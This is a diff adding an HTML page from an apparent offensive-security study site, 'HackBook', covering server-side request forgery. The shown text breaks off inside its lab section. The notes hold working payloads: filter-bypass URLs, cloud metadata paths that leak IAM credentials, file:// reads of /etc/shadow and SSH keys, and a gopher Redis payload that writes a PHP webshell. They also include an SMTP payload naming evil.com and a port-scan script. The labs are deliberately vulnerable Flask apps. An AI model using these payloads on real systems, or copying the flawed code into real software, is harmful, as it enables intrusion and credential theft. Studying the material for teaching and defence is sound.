@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | SSRF</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Server-Side Request Forgery (SSRF)</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== WHAT IS SSRF ==================== -->
+        <h2>What is SSRF?</h2>
+        <p>Server-Side Request Forgery forces the server to make HTTP requests to an attacker-controlled destination or to internal services that are not directly accessible. The server acts as a proxy — the request originates from the server's network position, bypassing firewalls and ACLs.</p>
+
+        <table>
+          <tr><th>SSRF Type</th><th>Description</th><th>Detection</th></tr>
+          <tr><td>Basic (In-Band)</td><td>Response from the internal request is returned to the attacker</td><td>Data appears in response body</td></tr>
+          <tr><td>Blind</td><td>No response returned — must use out-of-band techniques</td><td>DNS/HTTP callbacks to attacker server</td></tr>
+          <tr><td>Semi-Blind</td><td>Partial info leaked (status code, timing, error messages)</td><td>Response differences or timing analysis</td></tr>
+        </table>
+
+        <!-- ==================== BASIC SSRF ==================== -->
+        <h2>Basic SSRF — Accessing Internal Services</h2>
+        <p>If a web app fetches a URL supplied by the user (e.g., URL preview, webhook, PDF generator, image proxy), you can point it at internal resources.</p>
+
+<pre><code class="language-bash"># Typical vulnerable parameter
+https://target.com/fetch?url=http://127.0.0.1:8080/admin
+https://target.com/proxy?url=http://192.168.1.1/
+https://target.com/api/preview?link=http://localhost:3000/debug
+
+# Common internal targets
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/              # IPv6 loopback
+http://169.254.169.254/    # Cloud metadata
+http://192.168.0.1/        # Internal network</code></pre>
+
+        <h3>Common Vulnerable Functions / Libraries</h3>
+        <table>
+          <tr><th>Language</th><th>Vulnerable Functions</th></tr>
+          <tr><td>Python</td><td><code>requests.get(url)</code>, <code>urllib.request.urlopen(url)</code>, <code>http.client</code></td></tr>
+          <tr><td>PHP</td><td><code>file_get_contents($url)</code>, <code>curl_exec()</code>, <code>fopen($url)</code></td></tr>
+          <tr><td>Java</td><td><code>URL.openConnection()</code>, <code>HttpClient.send()</code>, <code>RestTemplate.getForObject()</code></td></tr>
+          <tr><td>Node.js</td><td><code>axios.get(url)</code>, <code>fetch(url)</code>, <code>http.get(url)</code></td></tr>
+          <tr><td>Ruby</td><td><code>Net::HTTP.get(uri)</code>, <code>open-uri</code>, <code>RestClient.get(url)</code></td></tr>
+        </table>
+
+<pre><code class="language-python"># Vulnerable Python example
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    # No validation — SSRF!
+    resp = requests.get(url)
+    return resp.text</code></pre>
+
+        <!-- ==================== BYPASS TECHNIQUES ==================== -->
+        <h2>Bypass Techniques</h2>
+
+        <h3>IP Address Representations</h3>
+        <p>Filters that block <code>127.0.0.1</code> or <code>localhost</code> can often be bypassed with alternative representations.</p>
+<pre><code class="language-bash"># Decimal (127.0.0.1 = 2130706433)
+http://2130706433/
+
+# Hex
+http://0x7f000001/
+http://0x7f.0x0.0x0.0x1/
+
+# Octal
+http://0177.0.0.01/
+http://0177.0000.0000.0001/
+
+# Mixed notation
+http://127.1/                  # Shorthand
+http://127.0.1/                # Shorthand
+http://0/                      # Some systems resolve to 127.0.0.1
+
+# IPv6
+http://[::1]/
+http://[0000::1]/
+http://[::ffff:127.0.0.1]/     # IPv4-mapped IPv6
+
+# Overflow (256+ wraps around in some parsers)
+http://127.0.0.1.nip.io/       # DNS wildcard service
+http://127.0.0.1.sslip.io/</code></pre>
+
+        <h3>DNS Rebinding</h3>
+        <p>Bypass allowlist checks by making a domain resolve to an allowed IP on first lookup (validation), then to <code>127.0.0.1</code> on the second lookup (actual request).</p>
+<pre><code class="language-bash"># Use a DNS rebinding service
+# rbndr.us lets you configure two IPs:
+http://7f000001.ALLOWED_IP.rbndr.us/
+
+# The domain alternates between resolving to:
+#   1st query: ALLOWED_IP (passes validation)
+#   2nd query: 127.0.0.1 (hits internal service)
+
+# Tools: singularity, rebinder, rbndr.us</code></pre>
+
+        <h3>URL Parsing Tricks</h3>
+<pre><code class="language-bash"># Credential section (userinfo) — parser confusion
+http://allowed.com@127.0.0.1/
+http://allowed.com:80@127.0.0.1/
+
+# Fragment trick
+http://127.0.0.1#@allowed.com
+
+# Backslash confusion (some parsers)
+http://allowed.com\@127.0.0.1/
+
+# URL encoding
+http://127.0.0.1/%2e%2e/admin
+http://%31%32%37%2e%30%2e%30%2e%31/     # 127.0.0.1 URL-encoded
+
+# Double encoding
+http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/
+
+# Unicode normalization
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/          # Enclosed alphanumerics</code></pre>
+
+        <h3>Open Redirect → SSRF</h3>
+        <p>If the server follows redirects and only validates the initial URL:</p>
+<pre><code class="language-bash"># Step 1: Find an open redirect on an allowed domain
+https://allowed.com/redirect?url=http://127.0.0.1/admin
+
+# Step 2: Use it as the SSRF target
+https://target.com/fetch?url=https://allowed.com/redirect?url=http://127.0.0.1/admin
+
+# Host your own redirect
+python3 -c "
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class R(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
+        self.end_headers()
+HTTPServer(('0.0.0.0', 8080), R).serve_forever()
+"</code></pre>
+
+        <h3>Protocol Smuggling</h3>
+<pre><code class="language-bash"># Bypass HTTP-only filters by abusing URL scheme handling
+# Some parsers accept non-standard schemes
+
+# CRLF injection in URL to smuggle raw requests
+http://127.0.0.1/%0d%0aHOST:%20internal%0d%0a%0d%0a
+
+# Using different protocols (if the fetcher supports them)
+dict://127.0.0.1:6379/INFO      # Redis
+ftp://127.0.0.1:21/
+sftp://127.0.0.1/
+tftp://127.0.0.1/</code></pre>
+
+        <!-- ==================== CLOUD METADATA ==================== -->
+        <h2>Cloud Metadata Endpoints</h2>
+        <p>Cloud VMs expose instance metadata at link-local addresses. SSRF to these endpoints leaks credentials, tokens, and infrastructure details.</p>
+
+        <h3>AWS (IMDSv1)</h3>
+<pre><code class="language-bash"># Base endpoint (no auth for IMDSv1)
+http://169.254.169.254/latest/meta-data/
+
+# Key targets
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# IAM credentials response contains:
+# AccessKeyId, SecretAccessKey, Token — use with AWS CLI
+export AWS_ACCESS_KEY_ID=...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws s3 ls</code></pre>
+
+        <h3>AWS (IMDSv2 — Token Required)</h3>
+<pre><code class="language-bash"># IMDSv2 requires a PUT to get a token first
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/
+
+# SSRF exploitation is harder with IMDSv2 because:
+# 1. Requires PUT method (many SSRF only allow GET)
+# 2. Custom header needed
+# 3. Token has TTL</code></pre>
+
+        <h3>GCP (Google Cloud)</h3>
+<pre><code class="language-bash"># Requires Metadata-Flavor header
+http://metadata.google.internal/computeMetadata/v1/
+# Header: Metadata-Flavor: Google
+
+# Key targets
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+
+# Also reachable at:
+http://169.254.169.254/computeMetadata/v1/</code></pre>
+
+        <h3>Azure</h3>
+<pre><code class="language-bash"># Requires Metadata: true header
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header: Metadata: true
+
+# Key targets
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network?api-version=2021-02-01</code></pre>
+
+        <h3>DigitalOcean</h3>
+<pre><code class="language-bash"># No auth headers required
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/user-data</code></pre>
+
+        <!-- ==================== FILE PROTOCOL ==================== -->
+        <h2>SSRF via file:// Protocol</h2>
+        <p>If the server-side fetcher supports <code>file://</code> URIs, you can read local files directly.</p>
+<pre><code class="language-bash"># Read local files
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ        # Environment variables (may contain secrets)
+file:///proc/self/cmdline
+file:///proc/net/tcp             # Open connections
+file:///home/user/.ssh/id_rsa
+file:///var/www/html/config.php
+
+# Windows
+file:///C:/Windows/System32/drivers/etc/hosts
+file:///C:/inetpub/wwwroot/web.config</code></pre>
+
+<pre><code class="language-python"># Python urllib follows file:// by default
+import urllib.request
+urllib.request.urlopen('file:///etc/passwd').read()
+
+# PHP file_get_contents supports file://
+file_get_contents('file:///etc/passwd')
+
+# Java URL class supports file://
+new URL("file:///etc/passwd").openStream()</code></pre>
+
+        <!-- ==================== GOPHER PROTOCOL ==================== -->
+        <h2>Gopher Protocol for Internal Service Interaction</h2>
+        <p><code>gopher://</code> lets you send raw TCP data — craft arbitrary protocol requests to internal services (Redis, MySQL, SMTP, etc.).</p>
+
+<pre><code class="language-bash"># Gopher URL format:
+gopher://HOST:PORT/_RAW_DATA
+
+# %0d%0a = \r\n (CRLF)
+
+# ---- Redis: Write a webshell ----
+gopher://127.0.0.1:6379/_%2A1%0d%0a%244%0d%0aFLUSHALL%0d%0a%2A3%0d%0a%243%0d%0aSET%0d%0a%241%0d%0a1%0d%0a%2434%0d%0a%0a%0a%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0a%0a%0d%0a%2A4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a/var/www/html%0d%0a%2A4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a%2A1%0d%0a%244%0d%0aSAVE%0d%0a
+
+# Decoded Redis commands:
+# FLUSHALL
+# SET 1 "\n\n&lt;?php system($_GET['cmd']);?&gt;\n\n"
+# CONFIG SET dir /var/www/html
+# CONFIG SET dbfilename shell.php
+# SAVE</code></pre>
+
+<pre><code class="language-bash"># ---- Redis: Read data ----
+gopher://127.0.0.1:6379/_INFO%0d%0aQUIT%0d%0a
+
+# ---- SMTP: Send email ----
+gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:%3Cattacker@evil.com%3E%0d%0aRCPT%20TO:%3Cvictim@target.com%3E%0d%0aDATA%0d%0aSubject:%20SSRF%0d%0a%0d%0aPwned%20via%20SSRF%0d%0a.%0d%0aQUIT%0d%0a
+
+# ---- MySQL (no password): ----
+# Use gopherus tool to auto-generate payloads
+python3 gopherus.py --exploit mysql</code></pre>
+
+        <h3>Gopherus Tool</h3>
+<pre><code class="language-bash"># Generate gopher payloads for common services
+git clone https://github.com/tarunkant/Gopherus.git
+cd Gopherus
+
+python3 gopherus.py --exploit mysql
+python3 gopherus.py --exploit redis
+python3 gopherus.py --exploit smtp
+python3 gopherus.py --exploit fastcgi
+python3 gopherus.py --exploit zabbix</code></pre>
+
+        <!-- ==================== BLIND SSRF ==================== -->
+        <h2>Blind SSRF (Out-of-Band Detection)</h2>
+        <p>When the server doesn't return the response body, use OOB techniques to confirm the vulnerability.</p>
+
+<pre><code class="language-bash"># DNS-based detection — use Burp Collaborator, interactsh, or dnslog.cn
+https://target.com/fetch?url=http://UNIQUE_ID.burpcollaborator.net/
+
+# interactsh (open-source alternative)
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+interactsh-client
+# Copy the generated subdomain, use it as the SSRF target
+https://target.com/fetch?url=http://RANDOM.oast.fun/
+
+# HTTP-based OOB — host your own listener
+python3 -m http.server 8080
+# Point the SSRF at your IP and watch for connections
+
+# Time-based detection
+# Target a closed port → timeout (slow)
+# Target an open port → fast response
+# Compare response times to infer open/closed ports</code></pre>
+
+        <!-- ==================== SSRF TO RCE ==================== -->
+        <h2>SSRF to RCE Chains</h2>
+
+        <h3>SSRF → Redis → Webshell</h3>
+<pre><code class="language-bash"># Use gopher:// to write a PHP webshell via Redis (see Gopher section)
+# Then access: http://target.com/shell.php?cmd=id</code></pre>
+
+        <h3>SSRF → Cloud Metadata → AWS Takeover</h3>
+<pre><code class="language-bash"># 1. SSRF to metadata endpoint
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
+
+# 2. Extract AccessKeyId, SecretAccessKey, Token
+# 3. Use credentials to access S3, EC2, Lambda, etc.
+aws s3 ls --region us-east-1
+aws ec2 describe-instances
+aws lambda list-functions</code></pre>
+
+        <h3>SSRF → Internal Admin Panel</h3>
+<pre><code class="language-bash"># Access admin endpoints only reachable from localhost
+http://127.0.0.1:8080/admin/execute?cmd=id
+http://127.0.0.1:9200/_search    # Elasticsearch
+http://127.0.0.1:5984/_all_dbs   # CouchDB
+http://127.0.0.1:8500/v1/agent/members  # Consul</code></pre>
+
+        <h3>SSRF → Internal Git/SVN</h3>
+<pre><code class="language-bash"># Read source code from internal repos
+http://127.0.0.1:3000/    # Gitea / Gogs
+http://127.0.0.1:8080/    # Jenkins
+http://127.0.0.1:8443/    # Kubernetes API</code></pre>
+
+        <!-- ==================== PORT SCANNING ==================== -->
+        <h2>Internal Port Scanning via SSRF</h2>
+<pre><code class="language-python"># Enumerate internal ports using SSRF
+import requests
+
+target = "https://vulnerable.com/fetch?url="
+
+for port in [21, 22, 25, 80, 443, 3000, 3306, 5432, 5984, 6379, 8080, 8443, 9200, 27017]:
+    url = f"{target}http://127.0.0.1:{port}/"
+    try:
+        r = requests.get(url, timeout=5)
+        if "connection refused" not in r.text.lower() and r.status_code != 500:
+            print(f"[+] Port {port} is open — {r.status_code} ({len(r.text)} bytes)")
+        else:
+            print(f"[-] Port {port} closed")
+    except requests.Timeout:
+        print(f"[?] Port {port} timed out (filtered?)")
+    except Exception as e:
+        print(f"[-] Port {port} error: {e}")</code></pre>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Basic SSRF — Access Internal Service</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use SSRF to access an internal admin panel not exposed to the internet.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SSRF lab (basic)
+from flask import Flask, request
+import requests as req
+
+app = Flask(__name__)
+
+# Public-facing endpoint with URL fetch
+@app.route('/preview')
+def preview():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;h1&gt;URL Previewer&lt;/h1&gt;&lt;form&gt;&lt;input name="url" placeholder="Enter URL"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;h1&gt;Preview&lt;/h1&gt;&lt;pre&gt;{resp.text[:2000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+# Internal-only admin panel (bound to localhost)
+@app.route('/admin')
+def admin():
+    if request.remote_addr != '127.0.0.1':
+        return '&lt;h1&gt;403 Forbidden&lt;/h1&gt;', 403
+    return '&lt;h1&gt;Admin Panel&lt;/h1&gt;&lt;p&gt;Secret: internal_service_data_12345&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the Flask app and visit <code>/preview?url=https://example.com</code> to confirm URL fetching works</li>
+              <li>Try accessing <code>/admin</code> directly — you'll get 403</li>
+              <li>Use the preview feature to fetch <code>http://127.0.0.1:5000/admin</code></li>
+              <li>Read the secret from the admin panel response</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Cloud Metadata Extraction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit SSRF to reach a simulated cloud metadata service and extract IAM credentials.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SSRF with simulated cloud metadata
+from flask import Flask, request
+import requests as req
+
+app = Flask(__name__)
+
+# Simulated cloud metadata service (runs on a separate port)
+meta_app = Flask('metadata')
+
+@meta_app.route('/latest/meta-data/')
+def meta_root():
+    return 'hostname\nlocal-ipv4\niam/'
+
+@meta_app.route('/latest/meta-data/iam/security-credentials/')
+def meta_iam():
+    return 'web-app-role'
+
+@meta_app.route('/latest/meta-data/iam/security-credentials/web-app-role')
+def meta_creds():
+    return '''{
+  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "FwoGZXIvYXdzEBAaDHqa0AP1.....EXAMPLETOKEN",
+  "Expiration": "2099-01-01T00:00:00Z"
+}'''
+
+# Main app with URL fetch and basic filter
+@app.route('/webhook')
+def webhook():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;h1&gt;Webhook Tester&lt;/h1&gt;&lt;form&gt;&lt;input name="url" placeholder="Webhook URL"&gt;&lt;button&gt;Test&lt;/button&gt;&lt;/form&gt;'
+    # Basic filter: block "169.254" and "metadata"
+    if '169.254' in url or 'metadata' in url.lower():
+        return '&lt;p&gt;Blocked: suspicious URL&lt;/p&gt;'
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;pre&gt;{resp.text[:3000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+if __name__ == '__main__':
+    import threading
+    threading.Thread(target=lambda: meta_app.run(port=8169, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the app — the metadata service starts on <code>127.0.0.1:8169</code></li>
+              <li>The filter blocks <code>169.254</code> and <code>metadata</code> — try direct access to confirm</li>
+              <li>Bypass the filter using IP encoding (decimal, hex, octal) or <code>127.0.0.1:8169</code> directly</li>
+              <li>Navigate through the metadata paths to extract IAM credentials</li>
+              <li>Bonus: Try DNS rebinding or redirect-based bypass</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: SSRF with Filter Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Bypass a multi-layered SSRF filter to reach an internal service and read a secret file.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SSRF with aggressive filtering
+from flask import Flask, request
+import requests as req
+from urllib.parse import urlparse
+import re, socket
+
+app = Flask(__name__)
+
+def is_blocked(url):
+    """Multi-layer SSRF filter"""
+    parsed = urlparse(url)
+    host = parsed.hostname or ''
+
+    # Block private IP ranges
+    blocked_patterns = [
+        r'^127\.', r'^10\.', r'^192\.168\.', r'^172\.(1[6-9]|2\d|3[01])\.',
+        r'^0\.', r'^169\.254\.', r'^localhost$', r'^\[?::1\]?$',
+        r'^0x', r'^\d+$'  # hex and decimal IPs
+    ]
+    for pattern in blocked_patterns:
+        if re.match(pattern, host, re.IGNORECASE):
+            return True
+
+    # Block dangerous schemes
+    if parsed.scheme not in ('http', 'https'):
+        return True
+
+    # DNS resolution check
+    try:
+        resolved = socket.getaddrinfo(host, None)
+        for entry in resolved:
+            ip = entry[4][0]
+            if ip.startswith('127.') or ip.startswith('10.') or ip.startswith('192.168.') or ip == '::1':
+                return True
+    except:
+        return True
+
+    return False
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;h1&gt;URL Fetcher&lt;/h1&gt;&lt;form&gt;&lt;input name="url" placeholder="URL"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    if is_blocked(url):
+        return '&lt;p&gt;Blocked by security filter.&lt;/p&gt;'
+    try:
+        resp = req.get(url, timeout=5, allow_redirects=True)
+        return f'&lt;pre&gt;{resp.text[:3000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+# Internal secret service
+@app.route('/internal/secret')
+def secret():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'TOP_SECRET: ssrf_filter_bypass_complete_42'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Study the filter — it blocks private IPs, resolves DNS, blocks non-HTTP schemes</li>
+              <li>Direct IP tricks won't work due to DNS resolution check</li>
+              <li>Key vulnerability: the filter checks the URL <strong>before</strong> fetching, but <code>allow_redirects=True</code></li>
+              <li>Strategy: host an external redirect that passes the filter check, then 302 redirects to <code>http://127.0.0.1:5000/internal/secret</code></li>
+              <li>Alternative: DNS rebinding — domain resolves to your public IP during filter check, then to 127.0.0.1 during fetch</li>
+              <li>Extract the secret string</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: SSRF via PDF Generation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a PDF report generator that renders user-supplied HTML to read local files via SSRF.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SSRF via PDF (requires: pip install flask weasyprint)
+from flask import Flask, request, send_file
+from weasyprint import HTML
+import io
+
+app = Flask(__name__)
+
+@app.route('/report', methods=['GET', 'POST'])
+def report():
+    if request.method == 'POST':
+        content = request.form.get('content', '&lt;h1&gt;Empty Report&lt;/h1&gt;')
+        pdf = HTML(string=content).write_pdf()
+        return send_file(io.BytesIO(pdf), mimetype='application/pdf', download_name='report.pdf')
+    return '''&lt;h1&gt;Report Generator&lt;/h1&gt;
+    &lt;form method="POST"&gt;&lt;textarea name="content" rows="10" cols="50"&gt;&lt;/textarea&gt;
+    &lt;br&gt;&lt;button&gt;Generate PDF&lt;/button&gt;&lt;/form&gt;'''
+
+# Internal service
+@app.route('/internal/secret')
+def secret():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'SSRF_PDF_SECRET_DATA_12345'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Generate a normal PDF with some HTML content</li>
+              <li>Inject an iframe or link: <code>&lt;iframe src="http://127.0.0.1:5000/internal/secret" width="800" height="600"&gt;&lt;/iframe&gt;</code></li>
+              <li>The PDF renderer fetches the URL server-side and embeds the response</li>
+              <li>Try reading local files: <code>&lt;iframe src="file:///etc/passwd"&gt;&lt;/iframe&gt;</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: SSRF URL Parsing Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit URL parser inconsistencies to bypass a hostname allowlist and reach internal services.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — URL parsing confusion
+from flask import Flask, request
+import requests as req
+from urllib.parse import urlparse
+
+app = Flask(__name__)
+
+ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    parsed = urlparse(url)
+    if parsed.hostname not in ALLOWED_HOSTS:
+        return f'&lt;p&gt;Host {parsed.hostname} not allowed. Only: {ALLOWED_HOSTS}&lt;/p&gt;'
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;pre&gt;{resp.text[:3000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+@app.route('/admin/secret')
+def secret():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'SSRF_PARSER_BYPASS_SECRET'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>The filter checks <code>urlparse().hostname</code> against an allowlist</li>
+              <li>Try URL confusion techniques:
+                <ul>
+                  <li><code>http://api.example.com@127.0.0.1/admin/secret</code></li>
+                  <li><code>http://127.0.0.1#@api.example.com</code></li>
+                  <li><code>http://api.example.com\@127.0.0.1/</code></li>
+                </ul>
+              </li>
+              <li>The key: <code>urlparse</code> and <code>requests</code> may parse the URL differently</li>
+              <li>Find a URL that passes the hostname check but fetches from localhost</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Blind SSRF Confirmation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Confirm and exploit a blind SSRF where the server's response is not returned to you.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Blind SSRF
+from flask import Flask, request
+import requests as req
+
+app = Flask(__name__)
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    url = request.form.get('url', '')
+    if url:
+        try:
+            req.get(url, timeout=5)
+        except:
+            pass
+    # Always returns the same response regardless of fetch result
+    return '&lt;p&gt;Webhook registered successfully.&lt;/p&gt;'
+
+@app.route('/internal/flag')
+def flag():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'FLAG{bl1nd_ssrf_c0nf1rm3d}'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-python"># Collaborator / callback listener
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"[+] Got callback: {self.path}")
+        self.send_response(200)
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Start your callback listener on port 8888</li>
+              <li>Submit <code>http://YOUR_IP:8888/test</code> as the webhook URL</li>
+              <li>Confirm the server makes outbound requests (you see the callback)</li>
+              <li>Scan internal ports via timing: <code>http://127.0.0.1:PORT/</code> — open ports respond faster</li>
+              <li>Use DNS-based exfiltration to extract internal data if possible</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: SSRF via File Upload</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a file upload feature that fetches remote URLs to download files.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SSRF via file import
+from flask import Flask, request
+import requests as req
+
+app = Flask(__name__)
+
+@app.route('/import', methods=['GET', 'POST'])
+def import_file():
+    if request.method == 'POST':
+        url = request.form.get('url', '')
+        if not url:
+            return '&lt;p&gt;Provide a URL&lt;/p&gt;'
+        try:
+            resp = req.get(url, timeout=5)
+            return f'&lt;h1&gt;Imported Content&lt;/h1&gt;&lt;pre&gt;{resp.text[:5000]}&lt;/pre&gt;'
+        except Exception as e:
+            return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+    return '''&lt;h1&gt;Import from URL&lt;/h1&gt;
+    &lt;form method="POST"&gt;&lt;input name="url" placeholder="https://example.com/data.csv"&gt;
+    &lt;button&gt;Import&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/internal/config')
+def config():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return '{"db_password": "s3cur3_p4ss", "api_key": "sk-1234567890"}'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Import a normal external URL to confirm functionality</li>
+              <li>Change the URL to <code>http://127.0.0.1:5000/internal/config</code></li>
+              <li>Read the internal configuration data including DB credentials</li>
+              <li>Try accessing other internal ports/services</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
